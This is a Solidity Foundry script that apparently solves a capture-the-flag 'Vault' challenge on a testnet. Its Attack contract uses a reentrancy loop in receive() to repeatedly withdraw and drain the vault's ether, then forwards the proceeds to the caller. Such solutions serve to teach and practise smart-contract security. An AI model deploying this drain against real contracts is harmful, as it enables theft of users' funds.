// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Vault} from "../src/Vault.sol";

contract VaultSolve is Script {
    Vault public vault = Vault(0x1B3C95A210A8C896b1C14D992600087668cd0174);
    address player = vm.envAddress("PLAYER");

    // // Deploy
    // function setUp() external{
    //     vault = new Vault{value: 1.7 ether}(player);
    //     vm.deal(player, 1 ether);
    // }
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Vault : ", address(vault));
        console.log("Vault balance: ", address(vault).balance);
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        Attack attack = new Attack(address(vault));
        console.log("Attack balance: ", address(attack).balance);

        attack.exploit{value: 0.001 ether}();

        console.log("Vault balance: ", address(vault).balance);
        console.log("Attack balance: ", address(attack).balance);
        console.log("Player balance: ", player.balance);


        vm.stopBroadcast();
    }
}

contract Attack{
    Vault public vault;

    constructor(address _vault) public {
        vault = Vault(_vault);

    }
    function exploit() public payable{
        vault.deposit{value: msg.value}(address(this));
        vault.withdraw(0.001 ether);

        // I need my testnet tokens back
        msg.sender.call{value : address(this).balance}("");
    }

    receive() payable external{
        if (address(vault).balance >= 0.001 ether){
            vault.withdraw(0.001 ether);
        }
    }
}
